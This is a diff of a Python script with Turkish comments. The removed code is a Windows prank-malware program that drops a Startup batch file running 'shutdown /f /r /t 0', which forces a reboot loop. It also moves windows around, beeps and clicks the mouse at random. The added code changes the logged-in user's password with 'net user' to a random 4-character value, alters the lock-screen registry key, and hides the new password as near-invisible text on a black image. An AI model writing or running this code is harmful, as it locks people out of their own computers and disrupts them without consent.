@@ -1,132 +1,129 @@
-import ctypes
+from PIL import Image, ImageDraw, ImageFont
 import os
+import platform
+import ctypes
 import random
-import time
-from ctypes import wintypes
-from threading import Thread
-import winsound  # Windows hata seslerini çalmak için
-import shutil  # Dosya kopyalamak için
+import string
+import subprocess
 
-# Windows API fonksiyonlarını tanımlama
-EnumWindows = ctypes.windll.user32.EnumWindows
-EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
-GetWindowText = ctypes.windll.user32.GetWindowTextW
-GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
-IsWindowVisible = ctypes.windll.user32.IsWindowVisible
-MoveWindow = ctypes.windll.user32.MoveWindow
-GetWindowRect = ctypes.windll.user32.GetWindowRect
+def generate_random_password(length=4):
+    """
+    Rastgele bir parola oluşturur.
+    - length: Parolanın uzunluğu (varsayılan: 16 karakter).
+    """
+    if length < 4:
+        raise ValueError("Parola uzunluğu en az 4 olmalıdır (büyük harf, küçük harf, rakam ve özel karakter için).")
 
-# Pencere bilgilerini saklamak için bir liste
-windows = []
+    # Parola için karakter havuzları
+    lower = string.ascii_lowercase  # Küçük harfler
+    upper = string.ascii_uppercase  # Büyük harfler
+    digits = string.digits          # Rakamlar
 
-def enum_windows_callback(hwnd, lParam):
-    """Açık olan pencereleri listeye ekler."""
-    if IsWindowVisible(hwnd):
-        length = GetWindowTextLength(hwnd)
-        if length > 0:
-            title = ctypes.create_unicode_buffer(length + 1)
-            GetWindowText(hwnd, title, length + 1)
-            windows.append(hwnd)
-    return True
-
-def get_open_windows():
-    """Açık olan tüm pencereleri alır."""
-    del windows[:]  # Listeyi temizle
-    EnumWindows(EnumWindowsProc(enum_windows_callback), 0)
-    return windows
-
-def bounce_window(hwnd):
-    """Bir pencereyi ekranda zıplatır."""
-    rect = wintypes.RECT()
-    GetWindowRect(hwnd, ctypes.byref(rect))
-    width = rect.right - rect.left
-    height = rect.bottom - rect.top
-
-    # Başlangıç pozisyonu
-    x, y = rect.left, rect.top
-    dx, dy = random.choice([-10, 10]), random.choice([-10, 10])
-    screen_width = ctypes.windll.user32.GetSystemMetrics(0)
-    screen_height = ctypes.windll.user32.GetSystemMetrics(1)
-
-    for _ in range(100):  # 100 adım boyunca hareket ettir
-        x += dx
-        y += dy
-        if x <= 0 or x + width >= screen_width:
-            dx = -dx
-        if y <= 0 or y + height >= screen_height:
-            dy = -dy
-        MoveWindow(hwnd, x, y, width, height, True)
-        time.sleep(0.05)
-
-def play_error_music():
-    """Hata seslerinden oluşan bir müzik çalar."""
-    notes = [
-        (440, 300),  # A4
-        (523, 300),  # C5
-        (659, 300),  # E5
-        (784, 300),  # G5
-        (880, 300),  # A5
+    # Her gruptan en az bir karakter seç
+    password = [
+        random.choice(lower),
+        random.choice(upper),
+        random.choice(digits),
     ]
-    for _ in range(3):  # 3 kez tekrar et
-        for freq, duration in notes:
-            winsound.Beep(freq, duration)
-            time.sleep(0.1)
 
-def move_and_click_mouse():
-    """Fareyi rastgele hareket ettirip tıklama yapar."""
-    screen_width = ctypes.windll.user32.GetSystemMetrics(0)  # Ekran genişliği
-    screen_height = ctypes.windll.user32.GetSystemMetrics(1)  # Ekran yüksekliği
+    # Geri kalan karakterleri rastgele seç
+    all_characters = lower + upper + digits
+    password += random.choices(all_characters, k=length - 1)
 
-    while True:
-        # Rastgele bir pozisyon seç
-        x = random.randint(0, screen_width)
-        y = random.randint(0, screen_height)
+    # Parolayı karıştır
+    random.shuffle(password)
 
-        # Fareyi hareket ettir
-        ctypes.windll.user32.SetCursorPos(x, y)
+    # Parolayı birleştir ve döndür
+    return ''.join(password)
 
-        # Sol tıklama simülasyonu
-        ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # Sol tuşa bas
-        ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # Sol tuşu bırak
+def create_hidden_text_image(output_path, text, image_size=(1920, 1080), text_color=(1, 1, 1)):
+    """
+    Siyah bir arka planda yazıyı gizler.
+    - output_path: Çıktı dosyasının yolu.
+    - text: Gizlenecek yazı.
+    - image_size: Görüntü boyutu (genişlik, yükseklik).
+    - text_color: Yazının rengi (çok koyu gri tonları önerilir).
+    """
+    # Siyah bir arka plan oluştur
+    image = Image.new("RGB", image_size, (0, 0, 0))
+    draw = ImageDraw.Draw(image)
 
-        time.sleep(random.uniform(0.5, 2))  # Rastgele bir süre bekle
+    # Yazı tipi ve boyutunu ayarla
+    if platform.system() == "Windows":
+        font_path = "C:/Windows/Fonts/arial.ttf"  # Windows için Arial fontu
+    elif platform.system() == "Darwin":  # macOS
+        font_path = "/System/Library/Fonts/Supplemental/Arial.ttf"
+    else:  # Linux
+        font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"  # Linux için alternatif font
 
-def add_to_startup():
-    """Kendini Windows başlangıcına ekler."""
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    script_path = os.path.abspath(__file__)  # Bu dosyanın tam yolu
-    startup_script = os.path.join(startup_folder, "File.bat")
+    # Yazı tipi dosyasının varlığını kontrol et
+    if not os.path.exists(font_path):
+        raise FileNotFoundError(f"Font dosyası bulunamadı: {font_path}")
 
-    # Başlangıç için bir .bat dosyası oluştur
-    with open(startup_script, "w") as f:
-        f.write(f'@echo off\nshutdown /f /r /t 0\n')
+    font = ImageFont.truetype(font_path, 100)
 
-def restart_system():
-    """Sistemi yeniden başlatır."""
-    try:
-        # Admin yetkisiyle komut çalıştırma
-        ctypes.windll.shell32.ShellExecuteW(
-            None, "runas", "cmd.exe", "/c shutdown /f /r /t 0", None, 1
-        )
-    except Exception:
-        pass  # Hata durumunda sessizce geç
+    # Yazıyı merkeze yerleştirmek için boyutunu hesapla
+    text_bbox = draw.textbbox((0, 0), text, font=font)  # Yazının sınırlarını al
+    text_width = text_bbox[2] - text_bbox[0]
+    text_height = text_bbox[3] - text_bbox[1]
+    text_x = (image_size[0] - text_width) // 2
+    text_y = (image_size[1] - text_height) // 2
 
-def main():
-    """Simülasyonun ana akışı."""
-    add_to_startup()  # Kendini başlangıca ekle
+    # Yazıyı çiz (çok koyu gri tonlarında)
+    draw.text((text_x, text_y), text, font=font, fill=text_color)
 
-    open_windows = get_open_windows()
-    for hwnd in open_windows:
-        bounce_window(hwnd)
+    # Görüntüyü kaydet
+    image.save(output_path, "PNG")
 
-    play_error_music()
-    restart_system()
+def set_lock_screen_background(image_path):
+    """
+    Windows kilit ekranı arka planını değiştirir.
+    - image_path: Yeni arka plan görüntüsünün yolu.
+    """
+    if platform.system() != "Windows":
+        raise NotImplementedError("Bu özellik yalnızca Windows'ta desteklenir.")
 
-    # Yeniden başlatma sonrası fare simülasyonunu başlat
-    mouse_thread = Thread(target=move_and_click_mouse)
-    mouse_thread.daemon = True
-    mouse_thread.start()
-    mouse_thread.join()
+    # Kilit ekranı arka planını değiştirmek için kayıt defteri ayarlarını yap
+    key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"
+    command = f'reg add "{key}" /v LockScreenImagePath /t REG_SZ /d "{image_path}" /f'
+    subprocess.run(command, shell=True, check=True)
 
-if __name__ == "__main__":
-    main()
+def change_user_password(new_password):
+    """
+    Kullanıcı parolasını değiştirir.
+    - new_password: Yeni parola.
+    """
+    if platform.system() != "Windows":
+        raise NotImplementedError("Bu özellik yalnızca Windows'ta desteklenir.")
+
+    # Kullanıcı parolasını değiştirmek için komut çalıştır
+    username = os.getlogin()
+    command = f'net user "{username}" "{new_password}"'
+    subprocess.run(command, shell=True, check=True)
+
+def show_message_box(message, title="Bilgilendirme"):
+    """
+    Kullanıcıya bir mesaj kutusu gösterir.
+    - message: Gösterilecek mesaj.
+    - title: Mesaj kutusunun başlığı.
+    """
+    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)
+
+# Kullanım
+output_image_path = "hidden_text.png"
+random_password = generate_random_password(4)  # Rastgele bir parola oluştur
+
+# Gizli metin içeren görüntüyü oluştur
+create_hidden_text_image(output_image_path, f"Parola: {random_password}", text_color=(1, 1, 1))
+
+# Kilit ekranı arka planını değiştir
+set_lock_screen_background(os.path.abspath(output_image_path))
+
+# Kullanıcı parolasını değiştir
+change_user_password(random_password)
+
+# Kullanıcıya bilgi mesajı göster
+show_message_box(
+    "Parola için arka plana bak. Unutma, şifreler hiçbir zaman parlak değildir.",
+    "Parola Bilgisi"
+)
